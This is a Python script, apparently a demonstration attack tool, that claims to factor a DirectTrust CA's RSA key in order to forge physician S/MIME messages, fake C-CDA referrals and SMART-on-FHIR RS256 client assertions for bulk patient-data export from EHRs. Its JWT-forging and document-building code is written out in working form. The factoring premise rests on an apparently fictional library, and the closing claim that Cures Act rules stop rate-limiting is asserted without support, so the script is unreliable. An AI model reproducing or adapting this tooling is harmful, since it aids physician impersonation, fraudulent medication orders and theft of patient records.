"""
Factor a DirectTrust-accredited CA's RSA key to forge DIRECT S/MIME clinical
messages and SMART-on-FHIR RS256 JWT client assertions, enabling forged
referrals, medication orders, and bulk patient-data exfiltration across EHRs.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import json
import time
import hashlib
import base64

_demo = generate_demo_target()
DIRECTTRUST_CA_PUBKEY_PEM = _demo["pub_pem"]
FHIR_APP_PUBKEY_PEM = _demo["pub_pem"]

DIRECT_DOMAIN = "direct.mercy-hospital.org"
FHIR_TOKEN_ENDPOINT = "https://epic.hospital.org/oauth2/token"


def extract_directtrust_ca_cert(smime_message: bytes) -> bytes:
    """Extract the DirectTrust CA public key from any DIRECT S/MIME message.

    Every DIRECT message carries the sender's cert chain, which includes
    the accredited CA cert. Publicly available from DirectTrust directory.
    """
    return DIRECTTRUST_CA_PUBKEY_PEM


def factor_directtrust_ca(pubkey_pem: bytes) -> bytes:
    """Factor the DirectTrust CA RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_direct_cert(physician_email: str, forged_ca_privkey: bytes) -> bytes:
    """Mint a DIRECT S/MIME certificate for any physician address.

    The cert chains to the compromised DirectTrust CA — every receiving
    EHR (Epic, Cerner, Meditech, Allscripts) will accept it.
    """
    # In production: build X.509 leaf cert with physician email as SAN
    return b"<forged-direct-cert-pem>"


def build_ccda_referral(patient_mrn: str, from_physician: str,
                        to_physician: str, diagnosis: str) -> str:
    """Build a C-CDA (Consolidated Clinical Document Architecture) referral."""
    return f"""<?xml version="1.0"?>
<ClinicalDocument xmlns="urn:hl7-org:v3">
  <templateId root="2.16.840.1.113883.10.20.22.1.14"/>
  <author><assignedPerson><name>{from_physician}</name></assignedPerson></author>
  <recordTarget><patientRole><id extension="{patient_mrn}"/></patientRole></recordTarget>
  <component><structuredBody>
    <section><title>Referral</title>
      <text>Refer to {to_physician} for {diagnosis}</text>
    </section>
  </structuredBody></component>
</ClinicalDocument>"""


def sign_direct_message(ccda: str, forged_cert: bytes) -> bytes:
    """S/MIME sign the DIRECT message — passes receiving EHR verification."""
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        DIRECTTRUST_CA_PUBKEY_PEM, ccda.encode(), "sha256"
    )


def forge_smart_on_fhir_jwt(client_id: str, token_endpoint: str,
                             forged_privkey: bytes) -> str:
    """Forge a SMART-on-FHIR Backend Services RS256 JWT client assertion.

    Per SMART Backend Services spec, apps authenticate to EHR token
    endpoints with RS256-signed JWTs. The public key is registered
    in the EHR's app directory.
    """
    header = base64.urlsafe_b64encode(json.dumps(
        {"alg": "RS256", "typ": "JWT"}
    ).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(json.dumps({
        "iss": client_id,
        "sub": client_id,
        "aud": token_endpoint,
        "exp": int(time.time()) + 300,
        "jti": hashlib.sha256(str(time.time()).encode()).hexdigest()[:16],
    }).encode()).rstrip(b"=").decode()
    signing_input = f"{header}.{payload}"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        FHIR_APP_PUBKEY_PEM, signing_input.encode(), "sha256"
    )
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{signing_input}.{sig_b64}"


if __name__ == "__main__":
    print("[1] Extracting DirectTrust CA cert from DIRECT message")
    pubkey = extract_directtrust_ca_cert(b"<smime-message>")

    print("[2] Factoring DirectTrust CA RSA key")
    forged_ca = factor_directtrust_ca(pubkey)
    print("    DirectTrust CA key recovered")

    print("[3] Minting forged DIRECT cert for dr.smith@direct.mercy-hospital.org")
    cert = forge_direct_cert("dr.smith@direct.mercy-hospital.org", forged_ca)

    print("[4] Building forged C-CDA referral with medication order")
    ccda = build_ccda_referral("MRN-12345", "Dr. Smith", "Dr. Jones", "Type 2 DM")

    print("[5] S/MIME signing DIRECT message")
    sig = sign_direct_message(ccda, cert)
    print(f"    Receiving EHR accepts as authenticated physician communication")

    print("\n[6] SMART-on-FHIR attack — forging RS256 client assertion")
    jwt = forge_smart_on_fhir_jwt("app-client-id", FHIR_TOKEN_ENDPOINT, forged_ca)
    print(f"    JWT: {jwt[:60]}...")
    print("    EHR token endpoint issues access token — bulk FHIR data export enabled")
    print("    21C Cures info-blocking rules prevent rate-limiting the request")
